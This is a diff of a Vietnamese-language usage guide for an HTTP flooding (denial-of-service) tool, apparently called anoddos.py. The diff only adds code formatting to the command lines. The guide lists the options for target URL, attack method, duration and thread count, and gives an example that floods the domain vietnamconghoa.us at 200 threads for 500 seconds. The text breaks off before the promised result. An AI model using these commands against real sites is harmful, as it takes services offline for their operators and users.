@@ -1,22 +1,22 @@
 Cú pháp câu lệnh:
-python3 overload.py [-h] [--target <URL>] [--method <HTTP>] [--time <time>]
-[--threads <threads>]
+`python3 anoddos.py [-h] [--target <URL>] [--method <HTTP>] [--time <time>]
+[--threads <threads>]`
 
 Trong đó
 
--h hay –help : hiển thị mục help của overload
+`-h hay –help` : hiển thị mục help của overload
 
-–target <URL>: mục tiêu mà bạn muốn nhắm tới
+`–target <URL>` : mục tiêu mà bạn muốn nhắm tới
 
-–method <HTTP>: kiểu tấn công
+`–method <HTTP>` : kiểu tấn công
 
-–time <giây>: Thời gian chạy tool
+`–time <giây>` : Thời gian chạy tool
 
-— thread <luồng>: số luồng trên giây <tối đa 200>
+`— thread <luồng>` : số luồng trên giây <tối đa 200>
 
 Ví dụ 
 
-python3 anoddos.py --target vietnamconghoa.us --method HTTP --time 500 --thread 200
+`python3 anoddos.py --target vietnamconghoa.us --method HTTP --time 500 --thread 200`
 
 Trong câu lệnh vừa rồi mình sử dụng Max thread xem web mình còn sống không và sau đây là kết quả
 
